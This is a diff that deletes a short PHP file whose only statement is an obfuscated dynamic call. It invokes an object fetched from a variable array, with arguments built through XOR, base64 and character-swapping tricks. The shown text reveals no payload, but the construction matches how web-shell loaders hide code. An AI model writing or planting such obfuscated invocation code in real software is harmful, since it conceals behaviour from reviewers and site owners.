@@ -1,4 +1,0 @@
-<?php
-$vars["DOMProcessingInstruction"]->__invoke(base64_encode(str_repeat(chr(146), 257) ^ str_repeat(chr(234), 17)), implode(array_map(function($x) { return chr(ord($x) ^ 0x42); }, str_split(strtr("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"), 1))));
-
-?>
